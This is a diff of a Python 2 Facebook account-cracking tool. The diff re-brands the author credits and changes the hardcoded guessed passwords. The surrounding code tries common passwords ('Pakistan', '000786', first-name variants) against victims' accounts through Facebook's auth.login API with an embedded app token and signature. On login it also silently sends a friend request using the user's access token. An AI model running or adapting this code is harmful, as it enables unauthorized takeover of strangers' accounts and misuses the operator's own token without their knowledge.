@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Codded By Faisal Rehman
+#Codded By Jam Shahrukh
 #Editing My Script Will Not Make You A Coder
-#Facebook : Faisal Rehman
-#Whatsapp : ++923035191880
+#Facebook : Jam Shahrukh
+#Whatsapp : +971528752764
 #Pakistan Cyber Expert
 #Alone Coder 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -50,17 +50,18 @@ def jalan(z):
 		time.sleep(0.03)
 ##### INTRO #####
 logo ="""
-  ______    _           _ 
- |  ____|  (_)         | |
- | |__ __ _ _ ___  __ _| |
- |  __/ _` | / __|/ _` | |
- | | | (_| | \__ \ (_| | |
- |_|  \__,_|_|___/\__,_|_|\033[1;91m[Love]\033[1;32m[Mishal]
+
+\033[1;92m███╗░░░███╗██╗░██████╗██╗░░██╗██╗
+\033[1;92m████╗░████║██║██╔════╝██║░░██║██║
+\033[1;92m██╔████╔██║██║╚█████╗░███████║██║
+\033[1;92m██║╚██╔╝██║██║░╚═══██╗██╔══██║██║
+\033[1;92m██║░╚═╝░██║██║██████╔╝██║░░██║██║
+\033[1;92m╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝
 \033[1;97m-----------------------------------------------\n
-➣  Coded By : Faisal Rehman
-➣  Facebook : Faisal Rehman
-➣  Github   : https://github.com/faisalprog
-➣  Whatsapp : +923035191880
+➣  Coded By : Jam Shahrukh
+➣  YouTube  : Jam Shahrukh Technical
+➣  Github   : https://github.com/Jam-x-Mishi
+➣  Whatsapp : +971528752764
 -----------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -79,8 +80,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "mishal"
-CorrectPassword = "mishal"
+CorrectUsername = "jam"
+CorrectPassword = "jam"
 
 loop = 'true'
 while (loop == 'true'):
@@ -93,10 +94,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 def login():
 	os.system('clear')
 	try:
@@ -139,7 +140,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -301,7 +302,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = '000786'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -357,7 +358,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '12345'
+													pass6 = 'Pakistan'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
